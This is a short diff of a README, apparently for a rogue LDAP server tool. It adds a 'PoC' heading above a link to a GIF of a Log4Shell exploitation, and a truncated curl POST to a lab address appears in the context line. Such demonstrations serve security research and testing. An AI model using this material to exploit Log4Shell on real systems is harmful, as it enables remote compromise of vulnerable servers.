@@ -117,6 +117,8 @@ curl -s -X POST http://192.168.1.6:8080/lol -H "Content-type:application/json" -
 
 ------------
 
+### PoC
+
 The full log4shell exploitation can be seen below  
 
 ![alt text](https://github.com/twelvesec/RogueLDAP/blob/main/images/log4shell-expl.gif)
